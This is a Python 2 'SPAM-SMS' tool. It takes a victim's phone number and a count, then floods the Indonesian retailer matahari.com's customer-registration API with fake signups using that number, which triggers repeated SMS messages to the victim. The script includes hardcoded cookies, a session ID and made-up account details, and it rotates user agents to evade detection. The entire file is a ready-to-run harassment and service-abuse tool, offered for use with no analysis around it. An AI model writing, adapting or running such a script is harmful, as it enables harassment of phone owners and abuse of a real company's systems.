# coding:utf8

# CODED BY : Yogi Ario
# GITHUB : https://github.com/account316

import json,sys,time,random,os
from time import sleep
import datetime

try:
   import requests
except ImportError:
   print(' \n\x1b[97m[\x1b[91m!\x1b[97m] You Still not Intall Module requests')
   print('     \x1b[97mPlease Type Install \x1b[91m: \x1b[93mpip2 install requests\n')
   sys.exit()


def spin():
        try:
                L="/-\\|"
                for q in range(75):
                        time.sleep(0.1)
                        sys.stdout.write("\r \x1b[1;97m\x1b[1;91m#\x1b[1;97m \x1b[1;97mStarting [\x1b[1;92m"+L[q % len(L)]+"\x1b[1;97m]")
                        sys.stdout.flush()
        except:
                exit()

class Akugans:

	def __init__(self):
		self.ses = requests.Session()

	def gas(self,____code08____):
		agent = open("agent.txt","r").read()
		acak = random.choice(agent.split("\n"))
		self.head = {
			"Host": "www.matahari.com",
			"content-length": "227",
			"accept": "*/*",
			"x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
			"x-requested-with": "XMLHttpRequest",
			"save-data": "on",
			"content-type": "application/json",
			"origin": "https://www.matahari.com",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"referer": "https://www.matahari.com/customer/account/create/",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			"cookie": "_ga=GA1.2.821151467.1610529007",
			"cookie": "_fbp=fb.1.1610529021660.369694841",
			"cookie": "PHPSESSID=39be8c17a536f5ecb7bde7d42f42cba8",
			"cookie": "PHPSESSID=39be8c17a536f5ecb7bde7d42f42cba8",
			"cookie": "_gid=GA1.2.582215395.1611381304",
			"cookie": "form_key=XpYpccQw9mYimXwD",
			"cookie": "mage-cache-storage=%7B%7D",
			"cookie": "mage-cache-storage-section-invalidation=%7B%7D",
			"cookie": "mage-cache-sessid=true",
			"cookie": "mage-messages=",
			"cookie": "recently_viewed_product=%7B%7D",
			"cookie": "recently_viewed_product_previous=%7B%7D",
			"cookie": "recently_compared_product=%7B%7D",
			"cookie": "recently_compared_product_previous=%7B%7D",
			"cookie": "product_data_storage=%7B%7D",
			"cookie": "ins-storage-version=3",}

		self.dat = json.dumps({"thor_customer":{"name":"account316 ","email_address":"aljabar@gmail.com","mobile_country_code":"+62","gender_id":"1","mobile_number":____code08____,"mro":"","password":"Jalancagak","birth_date":"19/01/2004"}})

		self.KangRikode = self.ses.post("https://www.matahari.com/rest/V1/thorCustomers",headers=self.head,data=self.dat)
		if "Succses" in self.KangRikode.text:
			print(" \x1b[91m! \x1b[97mError 404 Please Try again Later ")
		else:
			print(" \x1b[92m✓ \x1b[97mSent To \x1b[93m"+ ____code08____ +" \x1b[97m\x1b[101m Subscribe me YOugi Ario \033[0m \x1b[92mSucces")

while True:
	try:
		os.system('clear')
		print("""
	\x1b[93mSPAM-SMS

 \x1b[97m{\x1b[95m*\x1b[97m} Creator \x1b[90m: \x1b[97mYogi Ario
 \x1b[97m{\x1b[95m*\x1b[97m} Youtube \x1b[90m: \x1b[97mYogi Ario
 \x1b[97m{\x1b[95m*\x1b[97m} Github  \x1b[90m: \x1b[92mhttps://github.com/account316
\x1b[91m+\x1b[90m----------------------------------------------\x1b[91m+\n""")

		print(" \x1b[93m! \x1b[97mExample \x1b[90m: \x1b[97m08xxxx ")
		_____code08_____ = raw_input(" \x1b[92m• \x1b[97mNumber  \x1b[90m: \x1b[93m")
		____code62____ = raw_input(" \x1b[92m• \x1b[97mTotal  \x1b[90m: \x1b[93m")
		print('')
		spin()
		print('\n')

		main=Akugans()
		for coli in range(int(____code62____)):
				main.gas(_____code08_____)
		else:
			print("\x1b[91m\x1b[92m\x1b[93m\x1b[95m\033[0m")
		print(" \x1b[97m{\x1b[95m•\x1b[97m} Done")
		_____exec_____=raw_input(" \x1b[97m{\x1b[95m×\x1b[97m} Back To Spam ? y/n : ")
		if _____exec_____ =='y':
			Akugans()
		elif _____exec_____ =='n':
			print('\n \x1b[97mThankyou Please Subscribe me at youtube.com/yogiario \n')
			sys.exit()
	except Exception as Error:
		sys.exit(Error)